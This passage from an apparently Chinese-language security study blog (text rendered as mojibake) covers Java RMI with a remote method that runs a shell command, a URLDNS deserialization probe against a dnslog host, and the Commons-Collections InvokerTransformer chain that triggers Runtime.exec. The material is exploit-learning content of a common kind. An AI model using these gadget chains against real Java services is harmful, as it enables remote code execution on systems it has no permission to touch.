title="æœåŠ¡ç«¯"></a>æœåŠ¡ç«¯</h3><p>æœåŠ¡ç«¯ä¸ºkali</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">rmi</span><br><span class="line">â”œâ”€â”€ RemoteHelloworld.java</span><br><span class="line">â”œâ”€â”€ Rmi.java</span><br><span class="line">â””â”€â”€ Servet.java</span><br><span class="line"></span><br><span class="line"><span class="comment">//RemoteHelloworld.java</span></span><br><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHelloworld</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">Rmi</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        InputStream in = runtime.exec(<span class="string">&quot;id&quot;</span>).getInputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        in.read(bytes);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">RemoteHelloworld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Rmi.java</span></span><br><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Rmi</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Servet.java</span></span><br><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Servet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Rmi rmi = <span class="keyword">new</span> rmi.RemoteHelloworld();</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;rmi server already start&quot;</span>);</span><br><span class="line">        registry.rebind(<span class="string">&quot;rmi&quot;</span>,rmi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>è¸©å‘æŒ‡å—</p><p>æ˜¾ç¤ºè¿æ¥è¶…æ—¶ï¼Œå¤§æ¦‚ç‡æ˜¯å› ä¸ºæœåŠ¡ç«¯/etc/hosts æŒ‡å®šçš„é™¤localhostä¹‹å¤–çš„æ˜ å°„æ˜¯ä¸€ä¸ªå†…ç½‘ç½‘å€ï¼Œç½‘ä¸Šç»™å‡ºäº†å‡ ç§è§£å†³æ–¹æ¡ˆï¼Œ</p><blockquote><p>ç¬¬ä¸€ç§ åˆ é™¤/etc/hostså¯¹åº”è®°å½•</p><p>ç¬¬äºŒç§ è¿è¡Œæ—¶å¢åŠ <code>-Djava.rmi.server.hostname=æœåŠ¡å™¨çœŸå®å¤–ç½‘IP</code>å‚æ•°</p><p>ç¬¬ä¸‰ç§ æœåŠ¡ç«¯ä»£ç ä¸­å¢åŠ System.setProperty(â€œjava.rmi.server.hostnameâ€,â€å¤–ç½‘IPâ€);</p></blockquote><p>ä½†æ˜¯ä½¿ç”¨ä¸Šé¢ä¸‰ç§éƒ½æ— æ³•è§£å†³æˆ‘çš„é—®é¢˜ï¼Œæœ€ç»ˆå°†/etc/hostsä¸­æ˜ å°„åœ°å€æ”¹ä¸ºå…¬ç½‘åœ°å€</p><p><img src="/2021/10/31/java_study/java_day2/image-20211013110803852.png" alt="image-20211013110803852"></p></li></ul><h3 id="å®¢æˆ·ç«¯"><a href="#å®¢æˆ·ç«¯" class="headerlink" title="å®¢æˆ·ç«¯"></a>å®¢æˆ·ç«¯</h3><p>å®¢æˆ·ç«¯ä¸ºMac</p><p>å®¢æˆ·ç«¯ç›®å½•ç»“æ„åº”è¯¥ä¸æœåŠ¡ç«¯ä¿æŒä¸€è‡´ï¼Œå¹¶ä¸”å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯éƒ½åº”è¯¥æœ‰ç›¸åŒçš„Remoteæ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">rmi</span><br><span class="line">â”œâ”€â”€ ClientDemo.java</span><br><span class="line">â””â”€â”€ Rmi.java</span><br><span class="line">  </span><br><span class="line"><span class="comment">//ClientDemo.java</span></span><br><span class="line">  <span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"><span class="comment">//        Rmi rmi = (Rmi) Naming.lookup(&quot;rmi://172.16.173.2:1099/rmi&quot;);</span></span><br><span class="line"><span class="comment">//        String hello = rmi.hello();</span></span><br><span class="line"><span class="comment">//        System.out.println(hello);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;172.16.173.2&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        Rmi rmi1 = (Rmi) registry.lookup(<span class="string">&quot;rmi&quot;</span>);</span><br><span class="line">        System.out.println(rmi1.hello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Rmi.java</span></span><br><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Rmi</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæˆåŠŸåˆ©ç”¨<img src="/2021/10/31/java_study/java_day2/image-20211013110947505.png" alt="image-20211013110947505"></p>]]></content>
      
      
      
        <tags>
            
            <tag> java_study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java å­¦ä¹ æ—¥ç¨‹ï¼ˆä¸‰ï¼‰</title>
      <link href="/2021/10/31/java_study/java_day3/"/>
      <url>/2021/10/31/java_study/java_day3/</url>
      
        <content type="html"><![CDATA[<h2 id="day3â€”ååºåˆ—åŒ–"><a href="#day3â€”ååºåˆ—åŒ–" class="headerlink" title="day3â€”ååºåˆ—åŒ–"></a>day3â€”ååºåˆ—åŒ–</h2><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p>åˆ©ç”¨é“¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()--&gt;putVal(hash())</span><br><span class="line">|</span><br><span class="line">HashMap.hash()--&gt; key.hashCode()--&gt;key=new URL()</span><br><span class="line">|</span><br><span class="line">URL.hashCode()--&gt;URLStreamHandler.hashcode()</span><br><span class="line">|</span><br><span class="line">URLStreamHandler.hashcode()--&gt;getHostAddress()</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HashMap hashMap=<span class="keyword">new</span> HashMap();</span><br><span class="line">URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://he2kr6.dnslog.cn&quot;</span>);</span><br><span class="line">hashMap.put(url,<span class="number">123</span>);</span><br><span class="line"><span class="comment">//é˜²æ­¢ä¸¤æ¬¡è¯·æ±‚dns</span></span><br><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">Field f = clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">f.set(url,<span class="number">123</span>);</span><br><span class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;Object&quot;</span>);</span><br><span class="line">ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">os.writeObject(hashMap);</span><br><span class="line">FileInputStream test =<span class="keyword">new</span> FileInputStream(<span class="string">&quot;Object&quot;</span>);</span><br><span class="line">ObjectInputStream oi = <span class="keyword">new</span> ObjectInputStream(test);</span><br><span class="line">oi.readObject();</span><br></pre></td></tr></table></figure><h3 id="Common-Collections"><a href="#Common-Collections" class="headerlink" title="Common- Collections"></a>Common- Collections</h3><h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Transformer</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//demo</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬ä¼šnewä¸€ä¸ª<code>Transformer</code>æ•°ç»„ï¼Œæ³¨æ„ï¼šå®ƒå¹¶ä¸æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå› ä¸º<code>Transformer</code>æ˜¯ä¸€ä¸ªæ¥å£ï¼Œæ— æ³•åˆ›å»ºå®ä¾‹ï¼Œå®ƒåªæ˜¯ä¸€ä¸ªå­˜å‚¨å®ä¾‹çš„æ•°ç»„ï¼</p><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>æ¥ä¸‹æ¥å°±æ˜¯æ•°ç»„ä¸­å­˜åœ¨çš„å‚æ•°ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç¬¬ä¸€ä¸ªå‚æ•°åˆ›å»ºäº†ä¸€ä¸ª<code>ConstantTransformer</code>å®ä¾‹ï¼Œæˆ‘ä»¬è·Ÿè¿›<code>ConstantTransformer</code>,å¯ä»¥çœ‹åˆ°ä»–ç»§æ‰¿äº†<code>Transformer</code>æ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»–çš„æ„é€ æ–¹æ³•æ˜¯å°†Objectå¯¹è±¡èµ‹å€¼ç»™iConstantï¼Œè€Œtransformåˆæ˜¯è®²è¯¥å¯¹è±¡è¿”å›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>InvokerTransformer</code>çš„æ„é€ æ–¹æ³•æ˜¯è·å–ä¸‰ä¸ªå‚æ•°<code>æ–¹æ³•åã€å‚æ•°ç±»å‹ã€å‚æ•°</code>ï¼Œè€Œä»–çš„<code>transform</code>æ–¹æ³•å­˜åœ¨åå°„ï¼Œæ ¹æ®å‰é¢çš„çŸ¥è¯†ï¼Œæ˜¾è€Œæ˜“è§çš„éœ€è¦åœ¨è¿™é‡Œæ„é€ å‚æ•°é€ æˆå‘½ä»¤æ‰§è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æˆ‘ä»¬è¦æ€è€ƒå‡ ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬æ—¢ç„¶çŸ¥é“<code>InvokerTransformer</code>å¯ä»¥åå°„æ‰§è¡Œå‘½ä»¤ï¼Œæ ¹æ®ä¹‹å‰å­¦çš„åå°„çŸ¥è¯†ï¼Œæˆ‘ä»¬éœ€è¦å…ˆè·å–åˆ°ç±»ï¼Œå¯ä»¥çœ‹åˆ°åœ¨<code>InvokerTransformer.transform</code>ä¸­åå°„è·å–ç±»çš„æ–¹æ³•ä¸ºgetClassï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è·å–ä¸€ä¸ªç±»çš„å®ä¾‹</p><p>ç”±æ­¤ï¼Œæˆ‘ä»¬å°±å¾ˆæ¸…æ¥šçš„çŸ¥é“ä¸ºä»€ä¹ˆéœ€è¦<code>ConstantTransformer</code>ï¼Œå› ä¸ºå®ƒçš„<code>transform</code>æ–¹æ³•åˆšå¥½è¿”å›ä¸€ä¸ªå¯¹è±¡</p><p>é‚£ç°åœ¨åªéœ€è¦åšçš„å°±æ˜¯åˆ†åˆ«è°ƒç”¨<code>InvokerTransformerã€ConstantTransformer</code>çš„<code>transform</code>æ–¹æ³•ï¼Œå¹¶æŠŠ<code>ConstantTransformer</code>çš„è¿”å›å€¼ä½œä¸º<code>InvokerTransformer.transform</code>çš„å‚æ•°</p><p>æ¥ç€æˆ‘ä»¬ä»‹ç»ä¸€ä¸‹<code>ChainedTransformer</code> ï¼Œé¦–å…ˆæˆ‘ä»¬è·Ÿçš„æ—¶å€™å‘ç°ä»–çš„åˆå§‹åŒ–æ–¹æ³•å°±æ˜¯å°†è¾“å…¥çš„æ•°ç»„èµ‹å€¼ï¼Œé‚£æˆ‘ä»¬å†å»çœ‹ä¸€ä¸‹ä»–çš„<code>transform</code>æ–¹æ³•ï¼Œè¿™ä¸ªå°±å¾ˆæœ‰è¶£äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç›¸ä¿¡å¤§å®¶ä¸€çœ¼å°±å¯ä»¥çœ‹å‡ºæ˜¯æŒ‰é¡ºåºè°ƒç”¨æ•°ç»„å†…å¯¹è±¡çš„<code>transform</code>æ–¹æ³•ï¼Œå¹¶æŠŠå‰ä¸€ä¸ªçš„è¿”å›å€¼ä½œä¸ºä¸‹ä¸€ä¸ªå¯¹è±¡çš„è¾“å…¥ï¼Œè¿™å’Œæˆ‘ä»¬å‰é¢æ‰€éœ€è¦çš„åˆšå¥½åŒ¹é…</p><p>é‚£ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥å†™å‡ºä¸€ä¸ªæœ€ç®€å•çš„å‘½ä»¤æ‰§è¡Œæ–¹å¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><p>å½“ç„¶æˆ‘ä»¬ç›´æ¥å»è§¦å‘<code>transformerChain.transform(null);</code>è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨å…¶ä»–çš„æ–¹æ³•æ¥è§¦å‘ï¼Œç½‘ä¸Šå¾ˆå¤šæ–‡ç« éƒ½æ˜¯é€šè¿‡<code>TransformedMap</code>ç±»æ¥è§¦å‘ï¼Œé‚£æˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™ä¸ªç±»æ˜¯å¦‚ä½•è§¦å‘çš„</p><p>æˆ‘ä»¬æŸ¥çœ‹<code>TransformedMap</code>å¯ä»¥çœ‹åˆ°ä»–çš„åˆå§‹åŒ–æ–¹æ³•å¹¶ä¸èƒ½ç›´æ¥è°ƒç”¨ï¼Œéœ€è¦ä½¿ç”¨<code>TransformedMap.decorate()</code>æ–¹æ³•å»è§¦å‘ï¼Œä¼ å…¥å‚æ•°æœ‰ä¸‰ä¸ªï¼ˆMapç±»å‹ï¼Œkeyï¼Œvalueï¼‰ï¼Œæˆ‘ä»¬å…¨å±€å¯»æ‰¾æœ‰å“ªäº›åœ°æ–¹ä½¿ç”¨<code>transform</code>æ–¹æ³•,å¯ä»¥æ‰¾åˆ°<code>transformValueã€transformKey</code>ä¸¤ä¸ªåœ°æ–¹ï¼Œé‚£æˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨å“ªäº›åœ°æ–¹è°ƒç”¨äº†è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°åœ¨putæ–¹æ³•é‡Œä¼šè°ƒç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è§¦å‘<code>put</code>æ–¹æ³•å°±å¯ä»¥è°ƒç”¨</p><p>æ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆçš„è°ƒç”¨æ ˆä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TransformedMap-&gt;put</span><br><span class="line">TransformedMap-&gt;transformValue</span><br><span class="line">ChainedTransformer-&gt;transform</span><br><span class="line">ConstantTransformer</span><br><span class="line">InvokerTransformer</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> java_study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java å­¦ä¹ æ—¥ç¨‹ï¼ˆä¸€ï¼‰</title>
      <link href="/2021/10/31/java_study/java_day1/"/>
      <url>/2021/10/31/java_study/java_day1/</url>
      
        <content type="html"><![CDATA[<h2 id="day1â€”javaåå°„"><a href="#day1â€”javaåå°„" class="headerlink" title="day1â€”javaåå°„"></a>day1â€”javaåå°„</h2><h3 id="getClass"><a href="#getClass" class="headerlink" title="getClass"></a>getClass</h3><blockquote><p>Class.forName(â€œclassNameâ€) çŸ¥é“ç±»å</p><p>Demo.class åŠ è½½ç±»å</p><p>demo_reflect.getClass(); å®ä¾‹å¯¹è±¡è·å–class</p></blockquote><h3 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod"></a>getMethod</h3><blockquote><p>getMethod è·å–ç±»ä¸­æ–¹æ³• getMethod(â€œmethodNameâ€,å‚æ•°ç±»å‹çš„ç±»)</p><p>invoke ç”¨äºä¼ å‚ invoke(â€œå®ä¾‹å¯¹è±¡æˆ–ç±»â€,â€å‚æ•°â€)</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// get class</span></span><br><span class="line">        Demo_reflect demo_reflect = <span class="keyword">new</span> Demo_reflect();</span><br><span class="line">        